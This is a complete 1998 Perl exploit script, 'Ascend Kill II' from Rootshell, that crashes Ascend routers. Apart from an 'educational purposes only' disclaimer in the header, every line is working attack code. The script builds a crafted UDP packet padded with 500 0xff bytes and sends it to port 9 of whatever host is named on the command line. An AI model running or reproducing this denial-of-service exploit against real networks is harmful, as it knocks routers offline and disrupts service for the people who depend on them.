
#
# Ascend Kill II - perl version
# (C) 1998 Rootshell - http://www.rootshell.com/ - <info@rootshell.com>
#
# Released: 3/17/98
#
# Thanks to Secure Networks.  See SNI-26: Ascend Router Security Issues
# (http://www.secnet.com/sni-advisories/sni-26.ascendrouter.advisory.html)
#
#  NOTE: This program is NOT to be used for malicous purposes.  This is
#        intenteded for educational purposes only.  By using this program
#        you agree to use this for lawfull purposes ONLY.
#
#

use Socket;

require "getopts.pl";

sub AF_INET {2;}
sub SOCK_DGRAM {2;}

sub ascend_kill {
  $remotehost = shift(@_);
  chop($hostname = `hostname`);
  $port = 9;
  $SIG{'INT'} = 'dokill';
  $sockaddr = 'S n a4 x8';
  ($pname, $aliases, $proto) = getprotobyname('tcp');
  ($pname, $aliases, $port) = getservbyname($port, 'tcp')
  unless $port =~ /^\d+$/;
  ($pname, $aliases, $ptype, $len, $thisaddr) =
  gethostbyname($hostname);
  $this = pack($sockaddr, AF_INET, 0, $thisaddr);
  ($pname, $aliases, $ptype, $len, $thataddr) = gethostbyname($remotehost);
  $that = pack($sockaddr, AF_INET, $port, $thataddr);
  socket(S, &AF_INET, &SOCK_DGRAM, 0);
    $msg = pack("c64",
    0x00, 0x00, 0x07, 0xa2, 0x08, 0x12, 0xcc, 0xfd, 0xa4, 0x81, 0x00, 0x00,
    0x00, 0x00, 0x12, 0x34, 0x56, 0x78, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0xff, 0xff, 0x00, 0x4e, 0x41, 0x4d, 0x45, 0x4e, 0x41, 0x4d, 0x45, 0x4e,
    0x41, 0x4d, 0x45, 0x4e, 0x41, 0x4d, 0x45, 0xff, 0x50, 0x41, 0x53, 0x53,
    0x57, 0x4f, 0x52, 0x44, 0x50, 0x41, 0x53, 0x53, 0x57, 0x4f, 0x52, 0x44,
    0x50, 0x41, 0x53, 0x53);
  for ($i=0; $i<500; $i++) {
    $msg .= pack("c1", 0xff);
  }
  send(S,$msg,0,$that) || die "send:$!";
}

if ($ARGV[0] eq '') {
  print "usage: akill2.pl <remote_host>\n";
  exit;
}

&ascend_kill($ARGV[0]);
